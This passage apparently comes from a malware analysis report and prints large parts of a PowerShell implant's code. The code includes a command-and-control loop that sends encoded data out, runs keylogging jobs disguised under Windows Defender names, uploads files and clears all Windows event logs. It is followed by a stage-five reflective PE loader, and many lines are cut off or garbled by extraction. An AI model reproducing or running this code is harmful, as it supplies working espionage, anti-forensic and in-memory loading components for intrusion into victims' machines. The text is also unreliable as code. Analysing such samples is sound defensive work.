finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n  function debugingerror {\n    if($args[0][0]){$null = SMailstream-sendpost($(Encode-Packet -type 112 data $('{0}|{1}|{2}' -f $args[1],'buffmod',\n[System.Convert]::ToBase64String($agent['encodingutf'].getbytes($($args[0][0]|OutString))))))}\n    if($args[0][1]){$null = SMailstream-sendpost($(Encode-Packet -type 112 data $('{0}|{1}|{2}' -f $args[1],'errors',\n[System.Convert]::ToBase64String($agent['encodingutf'].getbytes($($args[0][1]|OutString))))))}\n    }\ndo {\n if($agent['fgrab']){\n if(!($agent['job']['WindowsFgDefender'])){getfgrablogs 6 $agent['fgver'] WindowsFgDefender}\n\n```\n\n-----\n\n```\n else {\n    $outout = Stop-AgentJob 'WindowsFgDefender'\n    debugingerror $outout 10\n    $agent['fgrab'] = $false\n    }\n }\n if($agent['watcher']){get-watcher 10 $agent['wver'] WindowsWatcherDefender}\n if (!($agent['job']['WindowsDefender'])){getcontentlogs 7 $agent['klver'] WindowsDefender}\n else {\n   if (Get-AgentJobCompleted 'WindowsDefender'){\n    $outout = Stop-AgentJob 'WindowsDefender'\n    debugingerror $outout 7\n    if($agent['klcount'] -gt 2){$agent['klver'] = 'ps'}\n    get-contentlogs 7 $agent['klver'] WindowsDefender\n    $agent['klcount'] += 1\n    }\n  }\nif($(ls $agent['paths'])){\n if ($agent['job']['UpdateSecID']) {\n  $outout = Stop-AgentJob 'UpdateSecID'\n  debugingerror $outout 5\n  Post-file 5 red UpdateSecID;\n  }\n else{\n  Post-file 5 gery UpdateSecID\n }\n}\nelse {\nif ($agent['job']['UpdateSecID']) {Stop-AgentJob 'UpdateSecID'}\n}\n if($agent['mischec'] -gt 460){iex logoff}\n $cmd = Get-Cmd;\n if ($cmd){\n   $agent['INTERVAL'] = $(@(110,90,134)|Get-Random);\n   ProcTasking $cmd\n   }\n else{\n    if ($agent['module']){get-moduledef}\n    if ($Error){debugingerror $(@($Error)) 9}\n    $Error.Clear()\n    [GC]::Collect()\n    [GC]::WaitForPendingFinalizers()\n    sleep -s $agent['INTERVAL']\n    $agent['INTERVAL'] = $(@(420,513,345)|Get-Random)\n    if($agent['priv']){TRunpil $('wevtutil el | % {wevtutil cl `\"$_`\"}')}\n   }\n  } while ($true)\n  $mtx.ReleaseMutex()\n  $mtx.Dispose()\n }\n\n```\n\n-----\n\n```\n}\n\n### On line 373, it downloads and execute the stage 5 code.\n\n## Stage five (function get-fgrablogs)\n\n### This is the PowerShell code on the fifth stage:\n\n```\n\n-----\n\n```\nfunction get fgruvers\n{\n[CmdletBinding()]\nParam(\n[Parameter(Position = 0)]\n[String[]]\n$ComputerName,\n  [Parameter(Position = 1, Mandatory = $false)]\n  [String]\n  $fpath,\n  [Parameter(Position = 2, Mandatory = $true)]\n  [String]\n  $idsid,\n  [Parameter(Position = 3, Mandatory = $true)]\n  [String]\n  $versid,\n  [Parameter(Position = 4, Mandatory = $true)]\n  [String]\n  $rckey\n)\nSet-StrictMode -Version 2\n$RemoteScriptBlock = {\n[CmdletBinding()]\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[String]\n$PEBytes64,\n    [Parameter(Position = 1, Mandatory = $true)]\n[String]\n$PEBytes32,\n[Parameter(Position = 2, Mandatory = $false)]\n[String]\n$FuncReturnType,\n[Parameter(Position = 3, Mandatory = $false)]\n[Int32]\n$ProcId,\n[Parameter(Position = 4, Mandatory = $false)]\n[String]\n$ProcName,\n    [Parameter(Position = 5, Mandatory = $false)]\n    [String]\n    $ExeArgs\n)\nFunction Get-Win32Types\n{\n$Win32Types = New-Object System.Object\n$Domain = [AppDomain]::CurrentDomain\n$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')\n$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.\n$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)\n$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors\n[0]\n$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])\n$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null\n\n```\n\n-----\n\n```\n$TypeBuilder.DefineLiteral( I386, [UInt16] 0x014c) | Out Null\n$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null\n$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null\n$MachineType = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType Value $MachineType\n$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])\n$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | OutNull\n$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | OutNull\n$MagicType = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType\n$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | O\nNull\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | OutNull\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null\n$SubSystemType = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType Value $SubSystemType\n$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])\n$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null\n$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null\n$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null\n$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040)\nNull\n$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x008\nNull\n$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | O\nNull\n$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) |\nNull\n$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | OutNull\n$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | OutNull\n$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null\n$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | O\nNull\n$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16]\nNull\n$DllCharacteristicsType = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType \n```\n\n-----\n\n```\nValue $DllCharacteristicsType\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFie\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.\n($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | OutNull\n($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null\n$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY Value $IMAGE_DATA_DIRECTORY\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.Val\n$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null\n$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER Value $IMAGE_FILE_HEADER\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFie\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [Syst\n($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | OutNull\n($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | OutNull\n($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) |\nNull\n($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12\nNull\n($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) |\nNull\n($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null\n($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out\nNull\n($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | OutNull\n($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Ou\nNull\n($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Ou\nNull\n\n```\n\n-----\n\n```\n($TypeBuilder.DefineField( MajorSubsystemVersion, [UInt16], Public )).SetOffset(48)\nNull\n($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50)\nNull\n($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | OutNull\n($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | OutNull\n($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | OutNull\n($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).Se\nNull\n($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | O\nNull\n($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out\nNull\n($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | OutNull\n($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) |\nNull\n($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(1\nNull\n($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(1\nNull\n($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset\nNull\n($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOff\nNull\n($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).Set\nNull\n($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) |\nNull\n($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(\nNull\n($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176\nNull\n($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184)\nNull\n($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffs\nNull\n($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(2\nNull\n($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Ou\nNull\n($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).S\nNull\n\n```\n\n-----\n\n```\n($TypeBuilder.DefineField( CLRRuntimeHeader, $IMAGE_DATA_DIRECTORY, Public )).SetOff\nNull\n($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232)\nNull\n$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 Value $IMAGE_OPTIONAL_HEADER64\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFie\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [Syst\n($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | OutNull\n($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | OutNull\n($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) |\nNull\n($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12\nNull\n($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) |\nNull\n($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null\n($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null\n($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out\nNull\n($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | OutNull\n($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Ou\nNull\n($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Ou\nNull\n($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48)\nNull\n($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50)\nNull\n($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | OutNull\n($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | OutNull\n($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | OutNull\n($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).Se\nNull\n($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | O\nNull\n\n```\n\n-----\n\n```\n($TypeBuilder.DefineField( SizeOfStackCommit, [UInt32], Public )).SetOffset(76) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Ou\nNull\n($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out\nNull\n($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | OutNull\n($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) |\nNull\n($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(9\nNull\n($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(1\nNull\n($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset\nNull\n($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffse\nNull\n($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOff\nNull\n($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).Set\nNull\n($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) |\nNull\n($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(\nNull\n($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160\nNull\n($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168)\nNull\n($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffs\nNull\n($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(1\nNull\n($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Ou\nNull\n($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).S\nNull\n($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOff\nNull\n($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216)\nNull\n$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 Value $IMAGE_OPTIONAL_HEADER32\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.Va\n$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null\n$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | OutNull\n$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 \n```\n\n-----\n\n```\nValue $IMAGE_NT_HEADERS64\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.Va\n$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null\n$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | OutNull\n$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 Value $IMAGE_NT_HEADERS32\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.Valu\n$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null\n$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')\n$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeCons\n$AttribBuilder = NewObject System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorVal\n$e_resField.SetCustomAttribute($AttribBuilder)\n$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null\n$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal\n$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n$AttribBuilder = NewObject System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorVal\n$e_res2Field.SetCustomAttribute($AttribBuilder)\n$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null\n$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER Value $IMAGE_DOS_HEADER\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.\n\n```\n\n-----\n\n```\n$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')\n$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n$AttribBuilder = NewObject System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorVal\n$nameField.SetCustomAttribute($AttribBuilder)\n$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER Value $IMAGE_SECTION_HEADER\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System\n$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null\n$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION Value $IMAGE_BASE_RELOCATION\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [Syst\n$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null\n$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR Value $IMAGE_IMPORT_DESCRIPTOR\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [Syste\n$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null\n$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null\n\n```\n\n-----\n\n```\n$IMAGE_EXPORT_DIRECTORY $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY Value $IMAGE_EXPORT_DIRECTORY\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)\n$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null\n$LUID = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.V\n$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null\n$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null\n$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES Value $LUID_AND_ATTRIBUTES\n$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeF\n$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, 